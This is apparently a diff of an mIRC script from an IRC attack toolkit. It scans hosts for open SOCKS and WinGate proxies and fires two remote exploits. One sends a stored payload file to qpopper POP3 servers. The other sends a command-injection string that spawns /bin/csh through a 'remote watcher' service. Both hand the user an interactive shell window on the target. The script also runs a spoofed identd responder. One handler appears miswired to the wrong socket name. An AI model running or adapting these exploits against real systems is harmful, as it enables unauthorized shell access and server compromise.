+ON *:SOCKOPEN:socks.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return } | logwrite -scan $sock($sockname).ip $sockname | window -n @scan | echo @scan ... SOCK Firewall found: $sock($sockname).ip ( $+ $fulldate $+ ) | sockclose $sockname }
+ON *:SOCKOPEN:wingt.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr } | return }
+ON *:SOCKREAD:wingt.*:{ sockread %wingt.data | if ($left(%wingt.data,8) == WinGate>) { logwrite -scan $sock($sockname).ip $sockname | window -n @scan | echo @scan ... WinGate found: $sock($sockname).ip ( $+ $fulldate $+ ) } | sockclose $sockname }
+
+; q p o p  e x p l o i t
+ON *:SOCKOPEN:qpopexp.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return } | bread $mircdiretc\qpopexp.txt 0 1018 &exp | sockwrite -n $sockname &exp }
+ON *:SOCKREAD:qpopexp.*:{ 
+  if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return }
+  window -ne @ $+ $sockname | titlebar @ $+ $sockname $sock($sockname).ip
+  sockread %qpopexp.data
+  if (-ERR isin %qpopexp.data) { echo @ $+ $sockname %qpopexp.data | echo @ $+ $sockname :-: exploit attempt failed: disconnection. | sockclose $sockname | return }
+echo %qpopexp.data @ $+ $sockname }
+ON *:SOCKCLOSE:qpopexp.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr } | echo @ $+ $sockname :-: exploit attempt failed: disconnected. }
+ON *:INPUT:@qpopexp.*:{ if (($left($1-,1) == /) || ($1- == $chr(32))) { return } | sockwrite $remove($active,@) $1- | echo $active $1- | halt }
+
+; r e m o t e  w a t c h e r  e x p l o i t
+ON *:SOCKOPEN:qpopexp.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return } | sockwrite $sockname $chr(32) $+ T11; /bin/csh }
+ON *:SOCKREAD:remwexp.*:{ 
+  if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr | return }
+  window -ne @ $+ $sockname | titlebar @ $+ $sockname $sock($sockname).ip
+  sockread %remwexp.data
+echo @ $+ $sockname %remwexp.data }
+ON *:SOCKCLOSE:remwexp.*:{ if ($sockerr != 0) { logwrite -sockerr $sockname $sock($sockname).ip $sockerr } | echo @ $+ $sockname :-: exploit attempt failed: disconnected. }
+ON *:INPUT:@remwexp.*:{ if (($left($1-,1) == /) || ($1- == $chr(32)) { return } | sockwrite $remove($active,@) $1- | echo $active $1- }
+; i d e n t d
+#identd on
+ON *:SOCKLISTEN:IN.AUTH: { inc %sock.auth | sockaccept auth $+ %sock.auth }
+ON *:SOCKREAD:auth*: { sockread %ident.s | if ($count(%ident.s,$chr(44)) != 1) { sockclose $sockname | return } | sockwrite -n $sockname $replace(%ident.s,$chr(44),$chr(44) $+ $chr(32)) : USERID : Sh[o]ck : %ident | sockclose $sockname }
+#identd end
